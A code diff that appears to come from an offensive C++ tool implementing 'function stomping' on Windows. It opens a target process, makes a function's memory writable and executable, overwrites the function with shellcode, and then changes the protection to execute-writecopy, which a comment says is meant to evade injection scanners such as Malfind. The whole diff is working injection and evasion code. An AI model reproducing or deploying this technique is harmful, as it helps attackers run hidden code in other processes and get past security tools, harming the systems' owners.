@@ -59,28 +59,45 @@ int FunctionStomping(DWORD pid)
 
     std::cout << "[+] Got function base!" << std::endl;
 
-    // Changing the protection of the function's address to RWX and writing our shellcode.
+    // Verifying that the shellcode isn't too big.
     DWORD oldPermissions;
     SIZE_T sizeToWrite = sizeof(shellcode);
 
-    if (sizeToWrite > 0x1000)
-        sizeToWrite = 0x1000;
+    if (sizeToWrite > 0x1000) {
+        std::cerr << "[-] Cannot write more than 4096 bytes! " << std::endl;
+        CloseHandle(procHandle);
+        return -1;
+    }
 
+    // Changing the protection to READWRITE to write the shellcode.
     if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_READWRITE, &oldPermissions)) {
         std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
         CloseHandle(procHandle);
         return -1;
     }
+    std::cout << "[+] Changed protection to RW to write the shellcode." << std::endl;
 
     SIZE_T written;
 
+    // Writing the shellcode to the remote process.
     if (!WriteProcessMemory(procHandle, functionBase, shellcode, sizeof(shellcode), &written)) {
         std::cerr << "[-] Failed to overwrite function: " << GetLastError() << std::endl;
+        VirtualProtectEx(procHandle, functionBase, sizeToWrite, oldPermissions, &oldPermissions);
+        CloseHandle(procHandle);
+        return -1;
+    }
+    
+    std::cout << "[+] Successfuly stomped the function!" << std::endl;
+
+    // Changing the protection to WCX to evade injection scanners like Malfind: https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners.
+    if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_WRITECOPY, &oldPermissions)) {
+        std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
         CloseHandle(procHandle);
         return -1;
     }
 
-    std::cout << "[+] Successfuly stomped the function!" << std::endl;
+    std::cout << "[+] Changed protection to WCX to run the shellcode!\n[+] Shellcode successfuly injected!" << std::endl;
+
     CloseHandle(procHandle);
     return 0;
 }
